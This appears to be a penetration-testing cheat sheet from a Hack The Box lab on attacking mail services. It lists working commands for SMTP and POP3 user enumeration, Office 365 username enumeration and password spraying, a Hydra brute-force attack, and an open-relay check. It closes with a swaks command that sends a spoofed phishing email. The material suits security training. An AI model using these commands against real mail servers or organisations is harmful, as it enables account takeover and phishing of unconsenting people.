## Enumeration

#### Host - MX Records

```sh
dig MX hackthebox.htb
```

#### Host - A Records

```sh
host -t A mail1.inlanefreight.htb.
```

- If we are targetting a custom mail server implementation , we can enumerate the following ports

|**Port**|**Service**|
|---|---|
|`TCP/25`|SMTP Unencrypted|
|`TCP/143`|IMAP4 Unencrypted|
|`TCP/110`|POP3 Unencrypted|
|`TCP/465`|SMTP Encrypted|
|`TCP/587`|SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS)|
|`TCP/993`|IMAP4 Encrypted|
|`TCP/995`|POP3 Encrypted|

```sh
 sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

## Misconfigurations

- The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`
#### VRFY Command

```sh
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

#### EXPN Command

- `EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list.

```sh
Akilesthedark@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```


#### RCPT TO Command

```sh
Akilesthedark@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

#### POP3 USER Command

- We can also use the `POP3` protocol to enumerate users

```sh
Akilesthedark@htb[/htb]$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```

#### Automated user finding 

```sh
 smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

## Cloud Enumeration

- [O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh), let's validate if our target domain is using Office 365

```sh
o365spray --validate --domain msplaintext.xyz
```

- Now, we can attempt to identify usernames.

```sh
o365spray --enum -U users.txt --domain msplaintext.xyz
```

## Password Attacks

- We can use `Hydra` to perform a password spray or brute force against email services such as `SMTP`, `POP3`, or `IMAP4`
#### Hydra - Password Attack

```sh
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

#### O365 Spray - Password Spraying

```sh
o365spray --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

## Protocol Specifics Attacks

#### Open Relay

- we can identify if an SMTP port allows an open relay.

```sh
 nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

- Next, we can use any mail client to connect to the mail server and send our email.

```sh
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

